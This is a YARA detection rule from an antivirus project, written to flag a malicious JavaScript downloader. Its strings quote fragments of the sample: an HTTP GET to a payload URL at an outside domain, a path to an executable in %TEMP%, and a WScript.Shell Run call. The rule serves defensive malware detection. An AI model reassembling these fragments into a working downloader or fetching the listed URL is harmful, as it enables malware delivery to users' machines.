rule sig_20160328_c6c4df33e63b152a644b2deb86b4248e {
  meta:
    description = "datamaliciousorder - file 20160328_c6c4df33e63b152a644b2deb86b4248e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "95a61d4fe3fabb07b3b5342e2c642ade3976186a71d163f25d7615a4b66843d5"

  strings:
    $s1  = "function Etdtaqbtj() {return Ypmgfjv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"B8RYr4Ym0nMReHq.exe\";};" fullword ascii
    $s2  = "Lgtihfvme[Teydhgju](\"GET\", \"http://bombers-original.com/mdj6sf\", false);" fullword ascii
    $s3  = "do {WScript[Ifsedx](Fvfewk() * 11)} while (Lgtihfvme[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Sxsgpy(Aavpyymtt, Wyksjkhe){return Aavpyymtt - Wyksjkhe;};" fullword ascii
    $s5  = "var Ypmgfjv = function Eqdnrnw() {return WScript[Kxjaa](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Galhd() {return ((Fxrhnkytv == true) && (Fxrhnkytv == Akorgk)) ? 1 : Lnqgbuid;};" fullword ascii
    $s7  = "function Ezsthv(Ffegiwyip){Ypmgfjv[\"Run\"](Ffegiwyip, Lnqgbuid, Lnqgbuid);};" fullword ascii
    $s8  = "function Shkekojpj(){return Codrxywsnp;};" fullword ascii
    $s9  = "Akorgk = true; " fullword ascii
    $s10 = "function Cjzvaw(Qvzgrazpmb) {var Tfctnrjf = (1, 2, 3, 4, 5, Qvzgrazpmb); return Tfctnrjf;};" fullword ascii
    $s11 = "Fxrhnkytv = true; " fullword ascii
    $s12 = " while (Vqscnj){" fullword ascii
    $s13 = "function Wutey()" fullword ascii
    $s14 = "return Sxsgpy(Ufaaln, Usgmxwdhef);" fullword ascii
    $s15 = "var Akorgk = false;" fullword ascii
    $s16 = "var Fxrhnkytv = false;" fullword ascii
    $s17 = "function Fvfewk(){return 22;};" fullword ascii
    $s18 = "var Wsqsi = false;" fullword ascii
    $s19 = "function Jzaraq(){return Kxjaa;};" fullword ascii
    $s20 = "var Gzevxlgbx = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}